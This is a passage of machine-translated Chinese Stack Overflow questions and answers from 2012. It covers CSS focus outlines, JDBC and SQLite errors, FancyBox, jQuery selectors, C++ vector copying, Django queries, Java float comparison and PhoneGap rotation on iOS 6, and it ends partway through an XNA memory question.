我有一个 html 页面。当我在 chrome 或 Safari 中获取页面时，文本框周围有一个黄色边框。

为了删除边框，我添加了

```
<style type="text/css">
  input{
  outline:none;
}
</style> 
```

边界已经消失。

但是，当我在 Mac 机器（chrome 和 Safari）中浏览页面时，它仍然存在。有人知道如何在 Mac 中修复它吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-12T21:08:05.930

```
:focus {
  outline: 0;
  outline-color: transparent;
  outline-style: none;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-15T14:23:50.123

如果您使用的是引导程序的 CSS，则可能是罪魁祸首。在这里找到问题：

```
select:focus, input[type="file"]:focus, input[type="radio"]:focus, input[type="checkbox"]:focus {
  outline: thin dotted #333;
  outline: 5px auto -webkit-focus-ring-color;
  outline-offset: -2px;
} 
```

如果你不能编辑 bootstap.css 使用这个，就像一个魅力。

```
select:focus, input:focus, textarea:focus {
  outline: 0;
  outline-color: transparent;
  outline-style: none;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T23:39:26.377

您可以尝试将其设置为无颜色：

```
.foo:active, .foo:focus {
  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
} 
```

# java - 使用Java连接到mysql数据库？

> ID：12866898
> 
> 赞同：-3
> 
> 时间：2012-10-12T20:48:46.163
> 
> 标签：java, mysql, jdbc, applet

当我使用此代码时，我在连接到 mysql 数据库时遇到问题。我已经检查了端口号是 3128。所以没有问题。我检查了它，我认为问题出在

```
connection= DriverManager.getConnection("jdbc:mysql://localhost:3128/gcc","root", "root"); 
```

编译时没有错误。有人可以帮我吗？

```
import java.awt.*;
import java.applet.*;
import java.awt.event.*;
import java.sql.*;
//import java.net.*;

public class Main extends Applet implements ActionListener
{
 TextArea tarea;
 Button bsubmit;

 public void init()
 {
  setBackground(new Color(0,0,0));
  setForeground(Color.white);

  Label l1=new Label("Write your code : ");
  l1.setFont(new Font("lucida console",Font.PLAIN,25));
  l1.setSize(200,30);

  tarea=new TextArea();
  tarea.setFont(new Font("lucida console",Font.PLAIN,18));
  tarea.setForeground(new Color(0,0,0));
  tarea.setSize(600,250);

  bsubmit=new Button("Submit");
  bsubmit.setFont(new Font("lucida console",Font.PLAIN,15));
  bsubmit.setBackground(new Color(255,255,255));
  bsubmit.setForeground(new Color(0,0,0));
  bsubmit.setSize(100,30);

  add(l1);
  add(tarea);
  add(bsubmit);

  setLayout(null);
  l1.setLocation(40,40);
  tarea.setLocation(40,100);
  bsubmit.setLocation(40,400);

  bsubmit.addActionListener(this);
 }

 public void actionPerformed(ActionEvent ae)
 {
  if(ae.getSource()==bsubmit)
  {
   Connection connection=null;
   try 
   {
    Class.forName("com.mysql.jdbc.Driver");
    connection= DriverManager.getConnection("jdbc:mysql://localhost:3128/gcc","root", "root");
    Statement stmt = connection.createStatement();
    stmt.executeUpdate("CREATE TABLE test2 (code VARCHAR(254))");
   } 
   catch (Exception e) {}
  }  
 }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-22T20:20:33.857

Java 数据库驱动程序是最糟糕的事情。我记得，我有我的第一个 JDBC 驱动程序（或者说：一个工作事务；）要在“仅”两天内安装，我认识一个有两个星期的人，哈哈。

在大多数情况下，最后一个问题是 SQL 问题。因为您需要将权限授予用户“用户名”@“IP”。您可以在表 user_privileges 的数据库 information_schema 中找到用户信息。有足够多的教程来处理它们，但我喜欢 'username'@'%' 在测试环境中获得所有权限。*微笑*

这可能会对您有所帮助：http: [//dev.mysql.com/doc/refman/5.1/de/adding-users.html](http://dev.mysql.com/doc/refman/5.1/de/adding-users.html)

是的，那些该死的 SQL 权限... ;D

@Luiggi：这当然不是愚蠢的问题！我有几个小时才能找到答案！我的意思是，哪个初学者知道Java sql类只是没有实现代码的xxxxxxx接口？！%D

**编辑**

无论如何：

```
Class.forName("...driverblabla..."); 
```

这段代码行看起来像 Java 吗？不，它是一个 xxxxxx 编译器黑客或其他什么！但它有效，它真的有什么作用！！

哦，但是对于某些驱动程序实现，这不起作用，你需要这个：

```
Class.forName("...driverblabla...").newInstance(); 
```

LMAO！

@Abhinav：将此行添加到您的 getConnection 行上方：

```
Class.forName("com.mysql.jdbc.driver").newInstance(); 
```

并且不要考虑它到底做了什么（我知道，但是......让我们搞砸它;）

# android - 插入和数据检索和访问错误时出现 NullPointerException

> ID：12866900
> 
> 赞同：0
> 
> 时间：2012-10-12T20:49:08.400
> 
> 标签：android, sqlite, intentservice

我试图在没有网络时将数据插入数据库，但它给了我一个`NullPointerException`. 当它上线时，它会给其他一些人并让我的应用程序崩溃。

**LogCat 错误**

```
 10-13 01:27:07.614: E/Service(13862): Service Created.. 
    10-13 01:27:08.054: E/Service Started(13862): Successful
    10-13 01:27:08.094: E/Insertion(13862): java.lang.NullPointerException
    10-13 01:27:09.134: E/Service Network(13862): Network is offline
    10-13 01:27:14.174: E/Service Network(13862): Network is offline
    10-13 01:28:29.154: E/Service Network(13862): Network is offline
    10-13 01:28:35.924: E/Service Network(13862): Network is offline
    10-13 01:28:39.174: E/Service Network(13862): Network is online
    10-13 01:28:39.204: E/AndroidRuntime(13862): FATAL EXCEPTION: Timer-0
    10-13 01:28:39.204: E/AndroidRuntime(13862): java.lang.NullPointerException
    10-13 01:28:39.204: E/AndroidRuntime(13862):    at com.remote.synchronizer.haris.SQLiteAdapter.getAllContacts(SQLiteAdapter.java:94)
    10-13 01:28:39.204: E/AndroidRuntime(13862):    at com.remote.synchronizer.haris.OfflineDataService.DataSender(OfflineDataService.java:96)
    10-13 01:28:39.204: E/AndroidRuntime(13862):    at com.remote.synchronizer.haris.OfflineDataService.access$0(OfflineDataService.java:90)
    10-13 01:28:39.204: E/AndroidRuntime(13862):    at com.remote.synchronizer.haris.OfflineDataService$1.run(OfflineDataService.java:67)
    10-13 01:28:39.204: E/AndroidRuntime(13862):    at java.util.Timer$TimerImpl.run(Timer.java:284) 
```

**离线数据服务.java**

```
package com.remote.synchronizer.haris;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.NameValuePair;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.util.Log;

public class OfflineDataService extends IntentService {

    boolean wifi,edge;
    private Timer timer= new Timer();
    SQLiteDatabase db;
    String un,shop,city,date,order;
    private SQLiteAdapter mySQLiteAdapter;
    Cursor cursor;

    public OfflineDataService() {
        super("OfflineDataService");
    }

    @Override   
    public void onCreate() {

        super.onCreate();
        Log.e("Service", "Service Created.. ");

         mySQLiteAdapter = new SQLiteAdapter(this);
         mySQLiteAdapter.getWritableDatabase();

}   

    @Override
    protected void onHandleIntent(Intent intent) {

        Bundle bundle=intent.getExtras();
        un=bundle.getString("un");
        shop=bundle.getString("shop");
        city=bundle.getString("city");
        date=bundle.getString("date");
        order=bundle.getString("order");

        Log.e("Service Started", "Successful");

        //Inserting New Record
        mySQLiteAdapter.insert(un,shop,city,date,order);

        timer.scheduleAtFixedRate(new TimerTask(){

            @Override
            public void run() {

                //Checking network connectivity
                   wifi=NetworkInfo.Wifi(OfflineDataService.this);
                   edge=NetworkInfo.EDGE(OfflineDataService.this);

                       if(wifi==true||edge==true)
                       {
                           Log.e("Service Network", "Network is online");
                           DataSender();
                       }
                       else
                       {
                           Log.e("Service Network", "Network is offline");
                       }
            }

        }, 1000, 5000);

    }

    /*@Override
    public void onDestroy() {

        super.onDestroy();
      //  mySQLiteAdapter.deleteAll();
        Log.e("Service Destroy", "Successful");

    }*/

    private void DataSender()
    {
        //timer.cancel();

        List<NameValuePair> contacts=new ArrayList<NameValuePair>();

        contacts=mySQLiteAdapter.getAllContacts();

         String url="http://10.0.2.2:3325/Product/Create?"; 

         int response = 0;

            try 
            {
                response = CustomHttpClient.executeHttpPost(url, contacts);

                if(response==200)
                {
                    Log.e("Data Sent", "Response 200");
                }

                else{

                    Log.e("Service Data", "Faield to upload data" );
                }

            }
            catch (Exception e)
            {
                Log.e("Data Sending", e.toString());
                e.printStackTrace();
            }
    }

} 
```

**SQLiteAdapter.java**

```
package com.remote.synchronizer.haris;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

public class SQLiteAdapter extends SQLiteOpenHelper {

    public static final String DATABASE_NAME = "Product";
    public static final String TABLE_NAME = "Orders";
    public static final int DATABASE_VERSION = 1;
    public static final String KEY_ID = " _id";  //
    public static final String KEY_NAME = "name";
    public static final String KEY_SHOP = "shop";
    private static final String KEY_CITY = "city";
    private static final String KEY_DATE = "datee";
    private static final String KEY_ORDER = "orderr";

    private static final String CREATE_TABLE =
        "CREATE TABLE " + TABLE_NAME + " ("
        + KEY_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, "
        + KEY_NAME + " VARCHAR,"
        + KEY_SHOP + " VARCHAR," + KEY_CITY + " VARCHAR, " + KEY_DATE + " VARCHAR, " + KEY_ORDER + " VARCHAR" +");";

    public SQLiteAdapter(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);  
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL(CREATE_TABLE);   
    }

    private SQLiteDatabase sqLiteDatabase;
    private SQLiteAdapter sqLiteHelper=this;

    public void close(){
        sqLiteHelper.close();
    }

    public void insert(String name, String shop, String city, String datee, String orderr){

        try
        {
        ContentValues contentValues = new ContentValues();
        contentValues.put(KEY_NAME, name);
        contentValues.put(KEY_SHOP, shop);
        contentValues.put(KEY_CITY, city);
        contentValues.put(KEY_DATE, datee);
        contentValues.put(KEY_ORDER, orderr);
        sqLiteDatabase.insertOrThrow(TABLE_NAME, KEY_ID, contentValues);
        //sqLiteDatabase.close();
        }
        catch(Exception e)
        {
            e.printStackTrace();
            Log.e("Insertion", e.toString());

            }
    }

    public void deleteAll(){
         sqLiteDatabase.delete(TABLE_NAME, null, null);
    }

    public void delete_byID(int id){
        sqLiteDatabase.delete(TABLE_NAME, KEY_ID+"="+id, null);
    }

    /*public Cursor queueAll(){
        String[] columns = new String[]{KEY_ID, KEY_NAME, KEY_SHOP, KEY_CITY,  KEY_DATE, KEY_ORDER};
        Cursor cursor = sqLiteDatabase.query(TABLE_NAME, columns, 
                null, null, null, null, null);

        return cursor;
    }*/

    public List<NameValuePair> getAllContacts() {
        List<NameValuePair> postParameters = new ArrayList<NameValuePair>();

        String selectQuery = "SELECT  * FROM " + TABLE_NAME;
        sqLiteHelper.getReadableDatabase();
        Cursor cursor = sqLiteDatabase.rawQuery(selectQuery, null);

        if(cursor.moveToFirst()){
            while(!cursor.isAfterLast())
            {
                postParameters.add(new BasicNameValuePair("User", cursor.getString(cursor.getColumnIndex(KEY_NAME))));
                postParameters.add(new BasicNameValuePair("ShopName", cursor.getString(cursor.getColumnIndex(KEY_SHOP))));
                postParameters.add(new BasicNameValuePair("city", cursor.getString(cursor.getColumnIndex(KEY_CITY))));
                postParameters.add(new BasicNameValuePair("OrderDate", cursor.getString(cursor.getColumnIndex(KEY_DATE))));
                postParameters.add(new BasicNameValuePair("OrderDetail", cursor.getString(cursor.getColumnIndex(KEY_ORDER))));
                cursor.moveToNext();
            }

        }
        //cursor.close();
        return postParameters;
    };

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        Log.w(SQLiteAdapter.class.getName(),
                "Upgrading database from version " + oldVersion + " to "
                    + newVersion + ", which will destroy all old data");
            db.execSQL("DROP TABLE IF EXISTS " + CREATE_TABLE);
            onCreate(db);
    }

} 
```

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:52:57.210

`sqLiteDatabase`你永远不会在你的`SQLiteAdapter`课堂上初始化。

`onCreate`将您的方法更改为：

```
@Override
public void onCreate(SQLiteDatabase db) {
    db.execSQL(CREATE_TABLE);
    sqLiteDatabase = db;
} 
```

# jquery - FancyBox 使用空白 html 重新加载当前窗口

> ID：12866902
> 
> 赞同：0
> 
> 时间：2012-10-12T20:49:14.897
> 
> 标签：jquery, asp.net, html, fancybox

我试图让一个fancybox 来加载一个ASPX 页面。它适用于其他页面，但不适用于此页面。fancybox jQuery 代码是相同的，html 是相同的——一切都相同，当然除了 ASPX 文件的内容。

那么，我的新页面中是否有任何可能导致此类事情发生的内容？

Firebug 也没有显示错误，因此它不像找不到页面。

* * *

这是不起作用的**元素**：

```
<a href='../DocumentUpload_SavedOffer.aspx' class="needsFancyBox">Click here to upload offer specific documents.</a> 
```

它是 FancyBox 代码：

```
$("a.needsFancyBox").fancybox({
    'hideOnContentClick': false,
    'padding': 0,
    'type': 'ajax',
    'centerOnScroll': false
}); 
```

这是可以正常工作的元素：

```
<a href="../rets/search.aspx" class="mlsSearch">Search</a> 
```

及其 FancyBox 代码：

```
$("a.mlsSearch").fancybox({
    'hideOnContentClick': false,
    'padding': 0,
    'type': 'ajax',
    'centerOnScroll': false
}); 
```

请注意，两个锚点都在同一个页面中，并且两个 jQuery fancybox 初始值设定项都在同一个 .js 文件中，该文件在站点范围内使用。打开的两个页面都是 .aspx，都具有有效的 html 等。但是，其中一个 .aspx 页面中必须有某些内容可能会导致此问题。

* * *

好的，这是非工作文件。我不会包含渲染的 html，因为其中很多都是非常专有的。

```
<asp:Content ID="Content1" ContentPlaceHolderID="headerContent" Runat="Server">
    <link rel="stylesheet" type="text/css" href="../includes/css/datagrid.css" />
    <link href="../includes/css/simpleform.css" rel="stylesheet" type="text/css" />
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="bodyContent" Runat="Server">
    <form id="frmMain" runat="server">
        <asp:HiddenField runat="server" ID="hdSavedOfferId" />
        <asp:ListView runat="server" ID="lstvwDocuments" DataKeyNames="docId">
            <LayoutTemplate>
                <table class="datagrid" cellpadding="0" cellspacing="0">
                    <tr>
                        <th>Document Title</th>
                        <th>Uploaded By</th>
                        <th style="border: 0px solid #99CC33">Upload Date</th>
                    </tr>
                    <asp:Literal runat="server" ID="itemPlaceholder" />
                </table>
            </LayoutTemplate>
            <ItemTemplate>
                <tr class='<%# Container.DisplayIndex % 2 == 1 ? "item" : "alt" %>'>
                    <td><%# Eval("docTitle") %></td>
                    <td><%# Eval("uploadedBy") %></td>
                    <td style="border: 0px solid #FFF"><%# Eval("uploadDate") %></td>
                </tr>
            </ItemTemplate>
        </asp:ListView>
        <br/>
        <br/>
        <fieldset class="simpleform">
            <legend>Upload Offer Specific Documents Here</legend>
            <dl>
                <dt><asp:Label ID="Label2" runat="server" Text="Document Title" /></dt>
                <dd>
                    <asp:TextBox ID="txtTitle" runat="server"></asp:TextBox>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidator1" runat="server" ControlToValidate="txtTitle" ErrorMessage="Please enter a title" ForeColor="Red" />
                </dd>
            </dl>
            <dl>
                <dt><asp:Label ID="Label3" runat="server" Text="Document to Upload" /></dt>
                <dd>
                    <asp:FileUpload ID="file_Image" runat="server" BorderColor="White" />
                    <asp:RequiredFieldValidator ID="RequiredFieldValidator2" runat="server" ControlToValidate="file_Image" ErrorMessage="Please add a document" ForeColor="Red"></asp:RequiredFieldValidator>
                </dd>
            </dl>
            <div style="clear: both;"><br /></div>
            <asp:Button ID="Button1" runat="server" Text="Upload" onclick="Button1_Click" CssClass="simplebutton" />
            <asp:Label ID="lblResult" runat="server" Text="" />
        </fieldset>
    </form>
</asp:Content>

<asp:Content ID="Content3" ContentPlaceHolderID="footerContent" Runat="Server">
</asp:Content> 
```

# jquery - jQuery：获取未定义类型的所有文本输入

> ID：12866903
> 
> 赞同：0
> 
> 时间：2012-10-12T20:49:14.687
> 
> 标签：jquery, jquery-selectors

当我使用时`$("input[type=text]")`，我绝对指的是所有文本框，但它只返回为它们设置的类型的输入。

例如在：

```
<input name="text1" />
<input name="text2' type="text"/> 
```

`text1`不包括在内。

无论是否设置了类型，如何获取所有文本输入？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:55:17.613

选择具有 type=text 的那些，以及没有 type 属性的那些。

```
$("input[type=text],input:not([type])") 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-12T20:56:40.163

```
$('input:text') 
```

[来自官方文档：](http://api.jquery.com/text-selector/)

> 从 jQuery 1.5.2 开始， :text 选择没有指定 type 属性的输入元素（在这种情况下 type="text" 是隐含的）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-12T20:56:02.443

您可以使用以下`filter`方法：

```
$("input").filter(function(){
    return this.type === 'text'
})​ 
```

[http://jsfiddle.net/hgzmQ/](http://jsfiddle.net/hgzmQ/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T20:54:26.313

如果您输入的所有名称都包含“文本”（否则您将如何理解它是一个文本框？），您可以尝试。

```
$('input[name*="text"]'); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-12T21:01:54.850

如果你不设置类型，那么 [type="text"] 将排除那些没有类型的。

如果您选择 $('input') 您将获得每个输入，无论类型如何，因此它可能是文本字段，也可能不是。但它仍然适用于每个输入字段。

如果不设置类型，它不会显示为 type=text，但会呈现为这样。这意味着您不能选择 JUST [type="text"]，但您始终可以排除其他人，但如下所示：

```
$('input[type=text]','input:not([type])') 
```

不确定这是否有帮助。

# tfs - TFS API 将单元测试与测试用例相关联

> ID：12866904
> 
> 赞同：1
> 
> 时间：2012-10-12T20:49:16.410
> 
> 标签：tfs, tfs-sdk

我知道我可以使用 TFS api 查询所有测试用例，但我不知道如何将单元测试与测试用例关联？有可能这样做吗？

为清楚起见，我希望以编程方式在测试列表编辑器中做我目前正在做的事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-14T03:46:07.617

这是一篇关于以编程方式将单元测试/编码的 ui 测试与测试用例相关联的帖子。 [http://blogs.msdn.com/b/gautamg/archive/2012/01/01/how-to-associate-automation-programmatically.aspx](http://blogs.msdn.com/b/gautamg/archive/2012/01/01/how-to-associate-automation-programmatically.aspx)

麦克风

# c++ - 将向量的内容复制到数组中的最快方法？

> ID：12866912
> 
> 赞同：16
> 
> 时间：2012-10-12T20:49:45.040
> 
> 标签：c++, vector

> **可能重复：**
> [如何将向量转换为数组 C++](https://stackoverflow.com/questions/2923272/how-to-convert-vector-to-array-c)

使用数组时，您可以使用

```
memcpy( void *destination, const void *source, size_t num ); 
```

然而，向量只是为复制方法提供迭代器，使 memcpy 无用。将矢量内容复制到另一个位置的最快方法是什么？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-10-12T20:51:53.257

[`std::copy`](http://en.cppreference.com/w/cpp/algorithm/copy)， 把手放下。它经过大量优化以在内部使用最佳可用方法。因此它与[`memcpy`](http://en.cppreference.com/w/cpp/string/byte/memcpy). 没有理由使用`memcpy`，即使在 C 样式数组或内存缓冲区之间复制时也是如此。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-10-12T20:52:25.997

您必须自己、在您的环境中、使用您的程序来衡量这一点。任何其他答案都会有太多警告。

当您这样做时，您可以比较*以下一种方法：*

```
std::copy(source.begin(), source.end(), destination); 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-10-12T20:53:03.190

试试这个：-

```
 std::vector<int> newvector(oldvector); 
```

要在数组中复制，请尝试以下操作：-

```
 std::copy(source.begin(), source.end(), destination); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-10-12T20:52:03.960

您可以将 memcpy 与向量一起使用 - 保证向量在内存中是连续的，因此只要向量不为空，您就可以使用`&vData[0]`（`vData`向量在哪里）作为指向的源指针`memcpy`

**编辑**正如对其他答案的评论所述，这仅在向量的 value_type 可轻松复制时才有效。

# javascript - Javascript 在本地工作，但不能在 niceEdit 的服务器上工作

> ID：12866918
> 
> 赞同：1
> 
> 时间：2012-10-12T20:50:22.177
> 
> 标签：javascript, jquery, webserver, localhost, nicedit

好吧，我几乎不知所措。我已经这样做了一段时间，并且总是在 Stack Overflow 或互联网上的某个地方找到我的答案。我从来没有遇到过我实际上不得不问的问题，但这个问题对我来说是不可理解的。

我有这段 javascript：

```
if($(".cmsArbitForm .nicEditor", this).is('*'))
{
    for(var i=0;i<nicEditors.editors.length;i++){
        nicEditors.editors[i].nicInstances[0].saveContent();
        $('.cmsArbitForm .nicEditor', this).css('display','block').css('position','absolute').css('top','0px');
    }
} 
```

这段代码在我的本地服务器上完美执行，但是当我把它放到网上时，我得到了这个错误

> 未捕获的类型错误：无法调用未定义的方法“保存内容”

我不明白这如何在本地主机上工作，但在相同网站和相同浏览器的实时服务器上却不行。

我尝试添加`-1`after `nicEditors.editors.length`，这实际上有效......直到第二次尝试提交此表单。在第二次尝试时，我再次遇到了同样的错误。我完全不知所措，所以任何帮助将不胜感激。我是新来的，所以如果我做错了什么，请告诉我。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T06:53:42.840

好吧，好吧，我想通了，我感觉很糟糕，因为我认为如果不知道和理解我的 1500 行长代码的全部内容，任何人都不可能想通这个。我不能太具体（解释一切需要很长时间），但长话短说，另一个导致我的一些文本区域的错误不存在，而我的一些文本区域应该是 nicEdit 的实例。这导致 nicEdit 引用没有内容要保存的实例，因为它们不存在。我现在一切都在正常工作。

不过，我要感谢 Stack Overflow 社区，感谢他们的友善和乐于助人。谢谢大家的时间。

# python - 使用 Django 进行复杂查询（来自所有朋友的帖子）

> ID：12866920
> 
> 赞同：7
> 
> 时间：2012-10-12T20:50:29.663
> 
> 标签：python, django, django-models

我是 Python 和 Django 的新手，所以请耐心等待。

我有以下型号：

```
class User(models.Model):
   name = models.CharField(max_length = 50)
   ...

class Post(models.Model):
   userBy = models.ForeignKey(User, related_name='post_user')
   userWall = models.ForeignKey(User, related_name='receive_user')
   timestamp = models.DateTimeField()
   post = models.TextField()

class Friend(models.Model):
   user1 = models.ForeignKey(User, related_name='request_user')
   user2 = models.ForeignKey(User, related_name='accept_user')
   isApproved = models.BooleanField()
   class Meta:
      unique_together = (('user1', 'user2'), ) 
```

我知道这可能不是用 Django 处理它的最好/最简单的方法，但我是这样学习的，我想保持这样。

现在，我想做的就是**从一个人和它的朋友那里得到所有的帖子**。现在的问题是如何使用 Django 过滤器来做到这一点？

我认为在 SQL 中它看起来像这样：

```
SELECT p.* FORM Post p, Friend f 
WHERE p.userBy=THEUSER OR (
    (f.user1=THEUSER AND f.user2=p.userBy) OR
    (f.user2=THEUSER AND f.user1=p.userBy)
) 
```

不保证正确性，只是为了说明我正在寻找的结果。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-12T20:56:31.787

```
from django.db.models import Q

Post.objects.filter( \
    Q(userBy=some_user) | \
    Q(userBy__accept_user__user1=some_user) | \
    Q(userBy__request_user__user2=some_user)).distinct() 
```

**更新**

对不起，那是我的错。我没有注意你的`related_name`价值观。请参阅上面的更新代码。单独使用`userBy__accept_user`or`userBy__request_user`是行不通的，因为那将是`Friend`您无法与 to 比较的参考`User`。我们在这里所做的是遵循反向关系`Friend`，然后一旦我们到达那里，查看好友请求中的*其他*用户是否是有问题的用户。

这也说明了适当描述反向关系的重要性。许多人犯了与您在这里犯的相同的错误，并在`related_name`他们创建 FK 的模型之后将其命名为 ( `User`)，而实际上，当我们谈论反转 FK 时，我们现在正在谈论`Friend`. 简单地说，您的相关名称将更有意义，例如：`friend_requests`和`accepted_friends`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:54:41.947

```
(with User u)
friends_u1 = Friend.objects.filter(user1 = u).getlist('user2_id', flat=True)
friends_u2 = Friend.objects.filter(user2 = u).getlist('user1_id', flat=True)
friends_and_user = friends_u1+friends_u2+u.id

Post.objects.filter(userBy__id__in = friends_and_user) 
```

# java - 关系运算符以何种方式不遵守带有浮点值的 compareTo 合同？

> ID：12866922
> 
> 赞同：11
> 
> 时间：2012-10-12T20:51:01.193
> 
> 标签：java, floating-point, compare, compareto

**引自 Joshua Bloch 的 Effective Java - Second Edition**

> 对于浮点字段，使用 Double.compare 或 Float.compare 代替关系运算符，它们在应用于浮点值时不遵守**compareTo的一般约定。**

它没有详细说明为什么会这样。

**所以，我的问题是：**

当与浮点值一起使用时，关系运算符以何种方式不遵守 compareTo 的一般约定？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T20:54:52.887

从[javadoc](http://docs.oracle.com/javase/7/docs/api/)：

```
 public int compareTo(Double anotherDouble) 
```

> 以数字方式比较两个 Double 对象。当应用于原始双精度值时，此方法执行的比较与 Java 语言数值比较运算符（<、<=、==、>=、>）执行的比较有两种不同之处：此方法考虑 Double.NaN方法等于自身并且大于所有其他双精度值（包括 Double.POSITIVE_INFINITY）。此方法认为 0.0d 大于 -0.0d。这确保了此方法强加的 Double 对象的自然排序与 equals 一致。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-12T20:54:39.910

来自 JavaDoc[`Double::compareTo`](http://docs.oracle.com/javase/6/docs/api/java/lang/Double.html#compareTo%28java.lang.Double%29)

> 以数字方式比较两个 Double 对象。当应用于原始双精度值时，此方法执行的比较与 Java 语言数值比较运算符（<、<=、==、>= >）执行的比较有两种不同之处：
> 
> *   此方法认为 Double.NaN 等于其自身并且大于所有其他双精度值（包括 Double.POSITIVE_INFINITY）。
>     
>     
> *   此方法认为 0.0d 大于 -0.0d。

这确保了 Double.compareTo(Object)（将其行为转发给此方法）遵守 Comparable.compareTo 的一般约定，并且 Doubles 上的自然顺序与 equals 一致。

```
 double d1 =Double.NaN;
    double d2 = Double.NaN;

    System.out.println(Double.valueOf(d1).equals(d2));    ---> true
    System.out.println(Double.valueOf(d1).compareTo(d2));  ---> 0
    System.out.println(d1 == d2);                          --->false 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-01-08T09:38:11.997

**根据 [Joshua_Bloch] Effective_Java，第 3 版**

本书的先前版本（第 2 版）建议 compareTo 方法使用关系运算符 < 和 > 比较整数原始字段，使用静态方法 Double.compare 和 Float.compare 比较浮点原始字段。在 Java 7 中，静态比较方法被添加到 Java 的所有盒装原始类中。在 compareTo 方法中使用关系运算符 < 和 > 很冗长且容易出错，因此不再推荐。

在 compareTo 方法的实现中比较字段值时，避免使用 < 和 > 运算符。相反，使用盒装原始类中的静态比较方法或 Comparator 接口中的比较器构造方法。

# cordova - 在 iOS 6 上，PhoneGap 2.1 iPad 应用不再自动旋转

> ID：12866938
> 
> 赞同：4
> 
> 时间：2012-10-12T20:52:27.443
> 
> 标签：cordova, rotation, ios6, autorotate

在 iOS 6 上运行应用程序时，我的应用程序不再成功自动旋转。我已经更新到 Cordova 2.1，我的`MainViewController.m`文件中有以下代码（它是 的子类`CDViewController`，与新的 iOS6 处理自动旋转的方式兼容：

```
- (BOOL) shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    // Return YES for supported orientations
    return [super shouldAutorotateToInterfaceOrientation:interfaceOrientation];
}

// iOS 6
- (BOOL)shouldAutorotate {
    return YES;
}

- (NSUInteger)supportedInterfaceOrientations
{
    NSUInteger ret = 0;

    if ([self shouldAutorotateToInterfaceOrientation:UIInterfaceOrientationPortrait])
        ret = ret | (1 << UIInterfaceOrientationPortrait);
    if ([self shouldAutorotateToInterfaceOrientation:UIInterfaceOrientationPortraitUpsideDown])
        ret = ret | (1 << UIInterfaceOrientationPortraitUpsideDown);
    if ([self shouldAutorotateToInterfaceOrientation:UIInterfaceOrientationLandscapeRight])
        ret = ret | (1 << UIInterfaceOrientationLandscapeRight);
    if ([self shouldAutorotateToInterfaceOrientation:UIInterfaceOrientationLandscapeLeft])
        ret = ret | (1 << UIInterfaceOrientationLandscapeLeft);

    return ret;
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-17T12:32:41.343

在您的 AppDelegate.m 中，您需要将以下内容添加到**didFinishLaunchingWithOptions**

```
[self.window setRootViewController:self.viewController]; 
```

添加后，旋转应该再次开始工作。它适用于我的两个应用程序。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-30T17:09:35.540

这里仍然太新，无法在此线程中投票支持 mattdryden 的答案。但是，我想支持他的回答，并且为了增加价值，请注意**他建议的修复也适用于 PhoneGap/Cordova 1.9**

我有一些应用程序尚未通过 PhoneGap/Cordova 1.9 --> 2.0/2.1 更新过程，并且手动使上述 AppDelegate.m 中建议的更改适用于这些应用程序。

此外，值得补充的是，你把这条线放在哪里似乎很重要。

我最初在之前添加了这一行：return YES 并且它失败了。事实证明，您需要将它放在此行**之前**：

```
[self.window addSubview:self.viewController.view]; 
```

还有一件事....帮助谷歌/等。更快地发现这个问题......控制台日志中需要添加此行的关键提示如下：

**应用程序窗口应该在应用程序启动结束时有一个根视图控制器**

添加上面提到的代码行会使这个错误消失......

希望这可以帮助其他人看到这个问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T14:30:26.440

我在 iOS 6 上的 iPad 应用程序遇到了类似的问题。出现此问题是因为 MainViewController 未设置为`AppDelegate.m`. 在你的`AppDelegate.m`替换：

```
[self.window addSubview:self.viewController.view]; 
```

和

```
self.window.rootViewController = self.viewController; 
```

# c# - 内存不足和溢出异常创建小数组

> ID：12866939
> 
> 赞同：1
> 
> 时间：2012-10-12T20:52:38.483
> 
> 标签：c#, arrays, xna, out-of-memory, overflowexception

我是 C# 和 XNA 的新手。刚刚设法编写了一个生成三角形网格的类。但是有一个问题。我可以获得最大 27 个节点长度的三角形。在 28 它抛出 Out of memory 异常和在 31 -overFlow 异常。

我不明白它是如何溢出或内存不足的......试图计算所有这些内存值，但它们看起来非常小。

